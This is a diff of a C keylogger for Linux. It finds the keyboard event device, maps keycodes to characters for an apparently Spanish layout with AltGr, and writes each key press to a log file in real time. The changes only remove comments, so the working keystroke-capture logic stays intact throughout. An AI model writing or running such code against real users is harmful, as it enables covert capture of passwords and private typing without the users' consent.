@@ -13,7 +13,7 @@
 static int shift_pressed = 0;
 static int ctrl_pressed = 0;
 static int alt_pressed = 0;
-static int altgr_pressed = 0; // Añadido para manejar AltGr
+static int altgr_pressed = 0; 
 
 char *getEventDevice();
 const char *get_char_from_keycode(int keycode);
@@ -59,7 +59,7 @@ char *getEventDevice() {
         exit(EXIT_FAILURE);
     }
     pclose(pipe);
-    event[strcspn(event, "\n")] = 0; // Remove newline character
+    event[strcspn(event, "\n")] = 0; 
     return event;
 }
 
@@ -82,7 +82,7 @@ const char *get_char_from_keycode(int keycode) {
         case KEY_O: return shift_pressed ? "O" : "o";
         case KEY_P: return shift_pressed ? "P" : "p";
         case KEY_Q: 
-            if (altgr_pressed) { // Añadido para manejar AltGr + Q
+            if (altgr_pressed) { 
                 return "@";
             } else {
                 return shift_pressed ? "Q" : "q";
@@ -110,7 +110,7 @@ const char *get_char_from_keycode(int keycode) {
         case KEY_102ND: return shift_pressed ? ">" : "<";
         case KEY_BACKSPACE: return "\b";
         case KEY_TAB: return "\t";
-        case KEY_LEFTBRACE: return shift_pressed ? "¨" : "`"; // Corregido el uso de la secuencia de escape
+        case KEY_LEFTBRACE: return shift_pressed ? "¨" : "`"; 
         case KEY_RIGHTBRACE: return shift_pressed ? "*" : "+";
         case KEY_ENTER: return "\n";
         case KEY_EQUAL: return shift_pressed ? "=":"0";
@@ -122,9 +122,9 @@ const char *get_char_from_keycode(int keycode) {
         case KEY_DOT: return shift_pressed ? ":" : ".";
         case KEY_SLASH: return shift_pressed ? "_" : "-";
         case KEY_SPACE: return " ";
-        case KEY_CAPSLOCK: return ""; // No visible character
-            return ""; // Function keys
-        default: return ""; // No mapping for this keycode
+        case KEY_CAPSLOCK: return "";
+            return "";
+        default: return "";
     }
 }
 
@@ -137,7 +137,7 @@ void log_key(int fd, FILE *fp) {
             exit(EXIT_FAILURE);
         }
         if (ev.type == EV_KEY) {
-            if (ev.value == 1) { // Key press event
+            if (ev.value == 1) { 
                 // Actualiza el estado de las teclas modificadoras
                 if (ev.code == KEY_LEFTSHIFT || ev.code == KEY_RIGHTSHIFT) {
                     shift_pressed = 1;
@@ -148,16 +148,16 @@ void log_key(int fd, FILE *fp) {
                 if (ev.code == KEY_LEFTALT) {
                     alt_pressed = 1;
                 }
-                if (ev.code == KEY_RIGHTALT) { // Añadido para manejar AltGr
+                if (ev.code == KEY_RIGHTALT) {
                     altgr_pressed = 1;
                 }
 
                 const char *c = get_char_from_keycode(ev.code);
                 if (c && *c) {
                     fputs(c, fp);
-                    fflush(fp); // Ensure the log is updated in real-time
+                    fflush(fp);
                 }
-            } else if (ev.value == 0) { // Key release event
+            } else if (ev.value == 0) {
                 // Actualiza el estado de las teclas modificadoras
                 if (ev.code == KEY_LEFTSHIFT || ev.code == KEY_RIGHTSHIFT) {
                     shift_pressed = 0;
@@ -168,7 +168,7 @@ void log_key(int fd, FILE *fp) {
                 if (ev.code == KEY_LEFTALT) {
                     alt_pressed = 0;
                 }
-                if (ev.code == KEY_RIGHTALT) { // Añadido para manejar AltGr
+                if (ev.code == KEY_RIGHTALT) { 
                     altgr_pressed = 0;
                 }
             }
